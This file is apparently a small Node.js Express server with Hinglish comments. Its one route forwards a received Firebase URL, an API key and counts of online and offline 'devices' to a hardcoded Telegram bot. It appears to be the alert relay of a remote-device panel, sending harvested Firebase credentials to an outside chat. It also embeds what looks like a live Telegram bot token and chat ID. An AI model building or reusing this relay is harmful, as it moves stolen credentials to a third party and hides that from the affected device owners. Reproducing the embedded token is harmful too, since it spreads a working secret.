const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());

// Tera Telegram Bot Token aur Chat ID
const TELEGRAM_BOT_TOKEN = '8862863749:AAEKDEEEwMjftL4SrVq70K-M4ZyuPZDjBsM';
const TELEGRAM_CHAT_ID = '8855682217';

// Home route
app.get('/', (req, res) => {
    res.send('Bot Server is Running!');
});

app.post('/panel-event', async (req, res) => {
    try {
        const firebaseUrl = req.body.firebase || req.body.firebase_url || req.body.firebaseUrl || 'N/A';
        const apiKey = req.body.key || req.body.api_key_masked || req.body.apiKey || 'N/A';
        
        // Online, Offline aur Total devices ka count
        const totalDevices = req.body.total || '0';
        const onlineDevices = req.body.online || '0';
        const offlineDevices = req.body.offline || '0';
        const method = req.body.method || 'Manual';

        const message = `🚨 *Naya Firebase Connection Aaya Hai!*\n\n` +
                        `🔗 *URL:* ${firebaseUrl}\n` +
                        `🔑 *Key:* ${apiKey}\n` +
                        `🟢 *Online Devices:* ${onlineDevices}\n` +
                        `🔴 *Offline Devices:* ${offlineDevices}\n` +
                        `📊 *Total Devices:* ${totalDevices}\n` +
                        `⚙️ *Method:* ${method}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();
        if (data.ok) {
            res.status(200).json({ success: true, message: 'Notification bhej di gayi hai!' });
        } else {
            res.status(500).json({ success: false, error: data.description });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server port ${PORT} par chal raha hai.`);
});
